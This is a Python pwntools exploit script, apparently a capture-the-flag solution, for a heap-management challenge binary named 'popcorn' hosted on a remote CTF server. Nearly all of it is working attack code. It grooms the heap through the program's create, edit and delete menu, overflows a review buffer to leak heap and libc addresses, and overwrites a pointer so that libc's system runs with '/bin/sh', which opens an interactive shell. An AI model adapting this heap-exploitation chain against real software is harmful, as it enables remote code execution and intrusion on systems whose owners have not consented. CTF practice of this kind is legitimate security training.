#!/usr/bin/env python3

from pwn import *

exe = ELF("./popcorn_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

#r = process([exe.path])
r = remote("netcat.deadsec.quest", 31985)

def sl(data):
    r.sendlineafter("> ", data)

def s(data):
    r.sendafter("> ", data)

def create(title):
    sl("1")
    s(title)
        
def edit(index):
    sl("2")
    sl(str(index))

def edit_title(index, new_title):
    edit(index)
    sl("1")
    s(new_title)

def create_review(index, size, review=b"", rate=-1, ):
    edit(index)
    sl("2")
    sl(str(size))
    if (rate == -1):
        sl("n")
        s(review)
    else:
        sl("y")
        sl(str(rate))
        s(review)

def edit_review(index, rate_index, data):
    edit(index)
    sl("3")
    sl(str(rate_index))
    s(data)

def delete_review(index, rate_index):
    edit(index)
    sl("4")
    sl(str(rate_index))


def free_movie(index):
    sl("4")

def print_movie(index):
    sl("3")
    sl(str(index))

def conn():
    return r


def main():
    r = conn()
    
    create("MAHER")
    for i in range(11):
        create_review(0, 0x20, b"M"*0x1f, rate=4)
   
    for i in range(10, 3, -1):
        print(i)
        delete_review(0, i)
    
    delete_review(0, 4)

    # movie 1 to be modified for code exec
    create(p64(0)*2 + p32(0x00040000))
         
    # overflow
    edit_review(0, 4, b"M"*8)
    create_review(0, 0x20, b"W"*0x1f, rate=5)
    create_review(0, 0x20, b"Z"*0x1f, rate=5)

    payload  = b"\x00"*0x250
    payload += p64(0) + p64(0x511)
    payload += p8(0)*0x90
    edit_review(0, 4, b"\x00"*0x250)
    
    print_movie(2)
    r.recvuntil("title: ")
    heap_leak = u64(r.recvline().strip() + p16(0))
    log.info("HEAP leak 0x%x\n", heap_leak)

    create("target")
    edit_review(0, 4, payload)
    create_review(1, 0x1f0, (p64(0)+p64(0x21))*0x1f, rate=4)
    create_review(1, 0x1f0, (p64(0)+p64(0x21))*0x1f, rate=4)
    create_review(1, 0x1f0, (p64(0)+p64(0x21))*0x1f, rate=4)
    
    delete_review(0, 4)
    edit_review(0, 4, p64(heap_leak + 0xa0) + p64(0) + p64(heap_leak - 0x230))
    

    create_review(1, 0x70, "HH", rate=4)
    
    print_movie(3)
    r.recvuntil("title: ")
    libc_leak = u64(r.recvline().strip() + p16(0))
    log.info("libc leak 0x%x\n", libc_leak)
    libc.address = libc_leak - 0x1ecbe0

    edit_review(0, 4, p64(heap_leak + 0xa0) + p64(0) + p64(heap_leak - 0x230) + cyclic_metasploit(0x18) + b"/bin/sh\x00" + p64(libc.sym.system))
    
    print_movie(2)
    r.interactive()


if __name__ == "__main__":
    main()
